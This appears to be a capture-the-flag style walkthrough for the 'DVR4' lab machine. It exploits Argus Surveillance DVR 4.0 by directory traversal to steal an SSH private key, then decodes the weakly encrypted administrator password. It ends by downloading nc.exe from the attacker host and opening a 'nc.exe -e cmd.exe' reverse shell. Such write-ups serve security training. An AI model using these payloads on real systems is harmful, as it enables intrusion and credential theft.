@@ -1,0 +1,408 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for DVR4</h1>
+<h2>Summary</h2>
+<p>In this guide, we will gain a foothold on the target system by gaining access to an SSH key via a Directory Traversal vulnerability in the DVR software. We will then elevate our privilege by decoding the Administrator password found in a configuration file.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll start by looking for open ports with an <code>nmap</code> scan.</p>
+<pre id="fence-code-37" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -sC 192.168.120.239
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 11:09 EST
+Nmap scan report for 192.168.120.239
+Host is up (0.032s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
+| ssh-hostkey: 
+|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
+|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Connection: Keep-Alive
+|     Keep-Alive: timeout=15, max=4
+|     Content-Type: text/html
+|     Content-Length: 985
+|     &lt;HTML&gt;
+|     &lt;HEAD&gt;
+|     &lt;TITLE&gt;
+|     Argus Surveillance DVR
+|     &lt;/TITLE&gt;
+|     &lt;meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"&gt;
+|     &lt;meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]"&gt;
+|     &lt;frameset frameborder="no" border="0" rows="75,*,88"&gt;
+|     &lt;frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0 
+|     &lt;frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginw&gt;
+|     &lt;frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" ma 
+|     &lt;noframes&gt;
+|     &lt;p&gt;This page uses frames, but your browser doesn't support them.&lt;/p&gt;
+|_    &lt;/noframes&gt;
+|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
+|_http-title: Argus Surveillance DVR
+</code></pre>
+<p>We find an SSH service running on port 22 and a webserver on port 8080. The webserver appears to be related to "Argus Surveillance DVR" according to the title.</p>
+<h3>Webserver Enumeration</h3>
+<p>Using a browser and navigating to http://192.168.120.239:8080, we find the web controller for this DVR software.</p>
+<p>We navigate to the About page at http://192.168.120.239:8080/About.html and discover that this is version <code>4.0</code> of the Argus Surveillance DVR. Let's see if there is anything we can use in ExploitDB by using <code>searchsploit</code>.</p>
+<pre id="fence-code-38" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit -u  
+...
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Argus Surveillance DVR 4.0
+------------------------------------------------------- ---------------------------------
+ Exploit Title                                         |  Path
+------------------------------------------------------- ---------------------------------
+Argus Surveillance DVR 4.0 - Unquoted Service Path     | windows/local/50261.txt
+Argus Surveillance DVR 4.0 - Weak Password Encryption  | windows/local/50130.py
+Argus Surveillance DVR 4.0.0.0 - Directory Traversal   | windows_x86/webapps/45296.txt
+Argus Surveillance DVR 4.0.0.0 - Privilege Escalation  | windows_x86/local/45312.c
+------------------------------------------------------- ---------------------------------
+</code></pre>
+<p>We are attempting to gain a shell access to the target, so the Directory Traversal is probably a good option to start with. Let's take a look at it's contents.</p>
+<pre id="fence-code-39" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit -x 45296
+
+# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
+# Author: John Page (aka hyp3rlinx)
+# Date: 2018-08-28
+# Vendor: www.argussurveillance.com
+# Software Link: http://www.argussurveillance.com/download/DVR_stp.exe
+# CVE: N/A
+
+# Description:
+# Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal,
+# leading to File Disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.
+
+# PoC
+
+curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD="
+
+# Result:
+
+; for 16-bit app support
+woafont=dosapp.fon
+EGA80WOA.FON=EGA80WOA.FON
+EGA40WOA.FON=EGA40WOA.FON
+CGA80WOA.FON=CGA80WOA.FON
+CGA40WOA.FON=CGA40WOA.FON
+
+wave=mmdrv.dll
+timer=timer.drv
+
+# https://vimeo.com/287115273
+# Greetz: ***Greetz: indoushka | Eduardo | GGA***
+
+</code></pre>
+<p>Using this information, we should be able to read arbitrary files on the target system. The example in the exploit content shows dumping the contents of <strong>system.ini</strong>. Let's give that a shot.</p>
+<pre id="fence-code-40" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl "http://192.168.120.239:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini"                                     
+; for 16-bit app support
+[386Enh]
+woafont=dosapp.fon
+EGA80WOA.FON=EGA80WOA.FON
+EGA40WOA.FON=EGA40WOA.FON
+CGA80WOA.FON=CGA80WOA.FON
+CGA40WOA.FON=CGA40WOA.FON
+
+[drivers]
+wave=mmdrv.dll
+timer=timer.drv
+
+[mci]
+
+</code></pre>
+<p>Success! Now we need to figure out what may be useful to dump from the target system. The only other service available to us is SSH. If we figure out any user accounts on the target, we could attempt to grab their SSH key to gain shell access.</p>
+<p>Back in the browser, we navigate to the Users page at http://192.168.120.239:8080/Users.html, we find entries for the users Administrator and Viewer. Perhaps Viewer is a user account on the system. If so, we should be able to get a copy of their <strong>id_rsa</strong> file.</p>
+<h2>Exploitation</h2>
+<p>Let's assume the user, viewer, stores their SSH key in the default location: <strong>C:/Users/viewer/.ssh/id_rsa</strong></p>
+<p>We can modify the curl command we ran before to attempt to grab this file. Let's redirect the response to a file.</p>
+<pre id="fence-code-41" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl "http://192.168.120.239:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa" &gt; id_rsa
+
+┌──(kali㉿kali)-[~]
+└─$ head id_rsa                                                                                            
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5J
+Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP
+iJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGx
+pgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS
+2LjjOKrgYM2aKwEN7asK3RMGDaqn1OlS4tpvCFvNshOzVq6l7pHQzc4lkf+bAi4K1YQXmo
+7xqSQPAs4/dx6e7bD2FC0d/V9cUw8onGZtD8UXeZWQ/hqiCphsRd9S5zumaiaPrO4CgoSZ
+GEQA4P7rdkpgVfERW0TP5fWPMZAyIEaLtOXAXmE5zXhTA9SvD6Zx2cMBfWmmsSO8F7pwAp
+zJo1ghz/gjsp1Ao9yLBRmLZx4k7AFg66gxavUPrLAAAFkMOav4nDmr+JAAAAB3NzaC1yc2
+</code></pre>
+<p>Next, we have to adjust the permissions and attempt to SSH as <code>viewer</code> to the target.</p>
+<pre id="fence-code-42" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ chmod 600 id_rsa
+
+┌──(kali㉿kali)-[~]
+└─$ ssh -i id_rsa viewer@192.168.120.239
+
+Microsoft Windows [Version 10.0.19042.1348]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\viewer&gt;whoami
+dvr4\viewer
+
+C:\Users\viewer&gt;
+</code></pre>
+<p>Success! We now have shell access on the target as viewer.</p>
+<h2>Escalation</h2>
+<p>Let's continue to look into this Argus server. We discover the configuration file located at: <strong>C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini</strong></p>
+<pre id="fence-code-43" class="fence-code"><code>C:\Users\viewer&gt;dir "C:\ProgramData\PY_Software\Argus Surveillance DVR"
+ Volume in drive C has no label.
+ Volume Serial Number is 08DF-534D
+
+ Directory of C:\ProgramData\PY_Software\Argus Surveillance DVR
+
+02/11/2022  09:42 AM    &lt;DIR&gt;          .
+02/11/2022  09:42 AM    &lt;DIR&gt;          ..
+02/11/2022  09:42 AM                38 Argus Surveillance DVR.DVRSes
+02/11/2022  09:42 AM             5,792 DVRParams.ini
+12/03/2021  12:26 AM    &lt;DIR&gt;          Gallery
+12/03/2021  12:24 AM    &lt;DIR&gt;          Images
+12/03/2021  12:26 AM    &lt;DIR&gt;          Logs
+               2 File(s)          5,830 bytes
+               5 Dir(s)   5,876,322,304 bytes free
+
+C:\Users\viewer&gt;type "C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini"
+[Main]
+...                                                                               
+                                                                                                            
+[Users]                                                                                                     
+LocalUsersCount=2                                                                                           
+UserID0=434499                                                                                              
+LoginName0=Administrator                                                                                    
+FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC8
+75EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083                                      
+FullControl0=1                                                                                              
+CanClose0=1                                                                                                 
+CanPlayback0=1                                                                                              
+CanPTZ0=1                                                                                                   
+CanRecord0=1                                                                                                
+CanConnect0=1                                                                                               
+CanReceiveAlerts0=1                                                                                         
+CanViewLogs0=1                                                                                              
+CanViewCamerasNumber0=0                                                                                     
+CannotBeRemoved0=1                                                                                          
+MaxConnectionTimeInMins0=0                                                                                  
+DailyTimeLimitInMins0=0                                                                                     
+MonthlyTimeLimitInMins0=0                                                                                   
+DailyTrafficLimitInKB0=0                                                                                    
+MonthlyTrafficLimitInKB0=0                                                                                  
+MaxStreams0=0                                                                                               
+MaxViewers0=0                                                                                               
+MaximumBitrateInKb0=0                                                                                       
+AccessFromIPsOnly0=                                                                                         
+AccessRestrictedForIPs0=                                                                                    
+MaxBytesSent0=0                                                                                             
+Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8                                                      
+...
+</code></pre>
+<p>Within this file, we find a password hash for the administrator account. It doesn't look like a familiar hash, so let's use <code>hash-identifier</code> to attempt to find out what kind of hash this is.</p>
+<pre id="fence-code-44" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ hash-identifier     
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
+
+ Not Found.
+</code></pre>
+<p>That didn't work. Back when we were looking for exploits for this Argus server, there was an entry with "Weak Password Encryption" in the title. It's a python script. Let's take a look at it.</p>
+<pre id="fence-code-45" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit -m 50130
+  Exploit: Argus Surveillance DVR 4.0 - Weak Password Encryption
+      URL: https://www.exploit-db.com/exploits/50130
+     Path: /usr/share/exploitdb/exploits/windows/local/50130.py
+File Type: ASCII text
+
+Copied to: /home/kali/50130.py
+
+┌──(kali㉿kali)-[~]
+└─$ cat 50130.py   
+# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
+# Exploit Author: Salman Asad (@LeoBreaker1411 / deathflash1411)
+# Date: 12.07.2021
+# Version: Argus Surveillance DVR 4.0
+# Tested on: Windows 7 x86 (Build 7601) &amp; Windows 10
+
+# Note: Argus Surveillance DVR 4.0 configuration is present in
+# C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
+
+# I'm too lazy to add special characters :P
+characters = {
+'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
+'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
+'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
+'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
+'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
+'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
+'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
+'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
+'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
+'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
+'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
+'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z'}
+
+# ASCII art is important xD
+banner = '''
+#########################################
+#    _____ Surveillance DVR 4.0         #
+#   /  _  \_______  ____  __ __  ______ #
+#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
+# /    |    \  | \/ /_/  &gt;  |  /\___ \  #
+# \____|__  /__|  \___  /|____//____  &gt; #
+#         \/     /_____/            \/  #
+#        Weak Password Encryption       #
+############ @deathflash1411 ############
+'''
+print(banner)
+
+# Change this :)
+pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"
+if (len(pass_hash)%4) != 0:
+        print("[!] Error, check your password hash")
+        exit()
+split = []
+n = 4
+for index in range(0, len(pass_hash), n):
+        split.append(pass_hash[index : index + n])
+
+for key in split:
+        if key in characters.keys():
+                print("[+] " + key + ":" + characters[key])
+        else:
+                print("[-] " + key + ":Unknown") 
+</code></pre>
+<p>Looking over this script, we find that we actually have an encrypted password and it's a simple substitution cipher. The hash appears to be hardcoded in the script. Let's replace it with the one we found in the Argus config file and run it.</p>
+<pre id="fence-code-46" class="fence-code"><code># Change this :)
+pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
+</code></pre>
+<pre id="fence-code-47" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ python3 50130.py 
+
+#########################################
+#    _____ Surveillance DVR 4.0         #
+#   /  _  \_______  ____  __ __  ______ #
+#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
+# /    |    \  | \/ /_/  &gt;  |  /\___ \  #
+# \____|__  /__|  \___  /|____//____  &gt; #
+#         \/     /_____/            \/  #
+#        Weak Password Encryption       #
+############ @deathflash1411 ############
+
+[+] ECB4:1
+[+] 53D1:4
+[+] 6069:W
+[+] F641:a
+[+] E03B:t
+[+] D9BD:c
+[+] 956B:h
+[+] FE36:D
+[+] BD8F:0
+[+] 3CD9:g
+[-] D9A8:Unknown
+</code></pre>
+<p>It appears that we were able to decode the password except for the final character. The last character of the password must be a special character as this script only accounts for numbers and letters. To figure out which special character it is, let's go back to the Argus website and open the Users page once again. We can create a new user account by clicking the "New User" button.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_97_image_1_ZZ3L7dbK.png" alt="Add new user on website">
+<figcaption>Add new user on website</figcaption>
+</figure>
+<p></p>
+<p>With the new user added, let's click "Change Password" in the row containing our new user account. We can set a password for this account and then read <strong>DVRParams.ini</strong> to see how each character is represented. Let's set a password of <code>!@#$%^&amp;*()</code> and read the INI file in our SSH session.</p>
+<pre id="fence-code-48" class="fence-code"><code>C:\Users\viewer&gt;type "C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini"
+...
+UserID2=204960737                                                                                           
+LoginName2=kali                                                                                             
+FullName2=                                                                                                  
+FullControl2=1                                                                                              
+CanClose2=1                                                                                                 
+CanPlayback2=1                                                                                              
+CanPTZ2=1                                                                                                   
+CanRecord2=1                                                                                                
+CanConnect2=1                                                                                               
+CanReceiveAlerts2=1                                                                                         
+CanViewLogs2=1                                                                                              
+CanViewCamerasNumber2=0                                                                                     
+CannotBeRemoved2=0                                                                                          
+MaxConnectionTimeInMins2=0                                                                                  
+DailyTimeLimitInMins2=0                                                                                     
+MonthlyTimeLimitInMins2=0                                                                                   
+DailyTrafficLimitInKB2=0                                                                                    
+MonthlyTrafficLimitInKB2=0                                                                                  
+MaxStreams2=0                                                                                               
+MaxViewers2=0                                                                                               
+MaximumBitrateInKb2=0                                                                                       
+AccessFromIPsOnly2=                                                                                         
+AccessRestrictedForIPs2=                                                                                    
+MaxBytesSent2=0                                                                                             
+Password2=B39878A7 
+...
+</code></pre>
+<p>That's odd. It appears that only 2 characters were encoded. It may be better to create single character passwords and check the encoded password one by one to figure out what the last character of the Administrator password is.</p>
+<p>Starting with "!", we find the following results:</p>
+<ul>
+<li>! = B398</li>
+<li>@ = 78A7</li>
+<li># = &lt;blank&gt; (This is probably why the first password didn't work)</li>
+<li>$ = D9A8</li>
+</ul>
+<p>We can stop here as the last character of the password we are trying to crack is "D9A8". So, now we know that the Administrator password is <code>14WatchD0g$</code>. We can attempt to use this password to SSH into the target using the Administrator account but it doesn't seem to be allowed.</p>
+<pre id="fence-code-49" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ ssh administrator@192.168.120.239   
+administrator@192.168.120.239's password: 
+Permission denied, please try again.
+</code></pre>
+<p>Perhaps we can upload a netcat executable and start an Administrator reverse shell using <code>runas</code>. Let's copy the <strong>nc.exe</strong> to our working directory and host it in a python webserver.</p>
+<pre id="fence-code-50" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ cp /usr/share/windows-binaries/nc.exe .                          
+                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<p>Back in the SSH session, let's create a temp directory and download <strong>nc.exe</strong> from our Kali host to this folder.</p>
+<pre id="fence-code-51" class="fence-code"><code>C:\Users\viewer&gt;mkdir C:\temp
+
+C:\Users\viewer&gt;powershell.exe -c "iwr http://192.168.118.14/nc.exe -OutFile C:\temp\nc.exe"  
+</code></pre>
+<p>Next, let's start a listener to catch our reverse shell.</p>
+<pre id="fence-code-52" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+<p>Finally, from our SSH session, let's use <code>runas</code> to attempt to start a reverse shell using the Administrator credentials.</p>
+<pre id="fence-code-53" class="fence-code"><code>C:\Users\viewer&gt;runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443" 
+Enter the password for DVR4\Administrator:                                                                  
+Attempting to start C:\temp\nc.exe -e cmd.exe 192.168.118.14 443 as user "DVR4\Administrator" ...
+</code></pre>
+<p>In our listener, we receive a connection from the target.</p>
+<pre id="fence-code-54" class="fence-code"><code>connect to [192.168.118.14] from (UNKNOWN) [192.168.120.239] 56706
+Microsoft Windows [Version 10.0.19042.1526]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\viewer&gt;whoami
+whoami
+dvr4\administrator
+
+C:\Users\viewer&gt;
+</code></pre>
+<p>Success! We now have Administrator access on the target system.</p>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
